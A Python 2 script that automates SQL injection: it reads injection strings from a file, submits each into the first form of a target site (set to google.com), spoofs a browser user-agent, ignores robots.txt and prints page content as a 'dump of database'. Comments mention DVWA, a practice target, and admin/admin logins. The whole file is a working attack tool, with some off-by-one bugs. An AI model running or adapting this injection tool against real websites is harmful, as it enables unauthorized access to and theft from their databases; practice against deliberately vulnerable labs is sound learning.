#!/usr/bin/python

#Bringing in mechanize and beautiful soup.  These are  installed separately from Python
import urllib2
import mechanize
from bs4 import BeautifulSoup
import cookielib

#Building the SQL injection
#hotSQLinjection = "' or ' 1 = 1"

#or from a file:
f_open = open("SQLIdatabase.txt",'r')
lines = f_open.readlines()
f_open.close()
output_array = []
for line in lines :
	line_stuff = line.split('\n')
	output_array.append(line_stuff)

hotSQLinjection = output_array

#Which website? 
WEBSITE = 'http://www.google.com'

#raw_input('Enter a Website to Investigate: ')


#---Non formed base url attacks
#base_url = ' '
#args = { 'operation' : 'view', 'groupId' : 10 }
#encode_args = urllib.urlencode(args)
#new_url = urllib.urlopen(base_url + '?' +encode_args
############################################

#Creating a mechanize browser
browser = mechanize.Browser()
# Cookie Jar
cj = cookielib.LWPCookieJar()
browser.set_cookiejar(cj)

# Browser options to prevent 403 errors
browser.set_handle_equiv(True)
browser.set_handle_gzip(True)
browser.set_handle_redirect(True)
browser.set_handle_referer(True)
browser.set_handle_robots(False)

# Follows refresh 0 but not hangs on refresh > 0
browser.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)

############################
# Want debugging messages?
#br.set_debug_http(True)
#br.set_debug_redirects(True)
#br.set_debug_responses(True)
#############################
# User-Agent (this is cheating, ok?)
browser.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]


#open selected browser 
browser.open(WEBSITE)

#Printing to browser title to show where I am
print "#" *55
print "#" + browser.title()
print "#" *55 + "\n"


#find & print forms 
for form in browser.forms() : 
	print form

#submit the form 
i=0
for items in hotSQLinjection :

	browser.select_form(nr=0)	
	browser.form['q'] = str(hotSQLinjection[i])
	browser.submit()
	i+=1
	print "\n"
	print "#" *55
	print "# " + " The SQL Injection that will be used is: " + str(hotSQLinjection[i])
	print "# " + " Injecting now"
	print "#" *55


#Below I am filling out the form fields and submitting for log in
#browser.form['username'] = 'admin'
#browser.form['password'] = 'admin'
#browser.submit()

#Again printing the browser title to show where I am
	print "#" *55
	print "# " + browser.title()
	print "#" *55



#Inserting the SQL Injection into the form filed and submitting
#browser.select_form(nr=0)

#This feeds the the browser page into a variable to feed into the BeautifulSoup parser
	page1 =  browser.response().read()

#As it says!
	print "\n"
	print "#" *55
	print "# " + " Feeding page into BeautifulSoup LXML Parser"
	print "#" *55

	soup1 = BeautifulSoup(page1, "lxml")

#The "sensitive" info from the injection is surrounded by tags
#This creates a list to iterate though
	allPRE =  soup1.find_all('pre')

#Printing out the "sensitve" information from the DVWA database
	print "\n"
	print "#" *55
	print "# " + " Dump of database"
	print "#" *55

#Iterating through the list

	for pre in allPRE :
    		print pre

#All done
	print "\n"
	print "#" *55
	print "# " + " Injection and dump complete"
	print "#" *55
	print "\n"


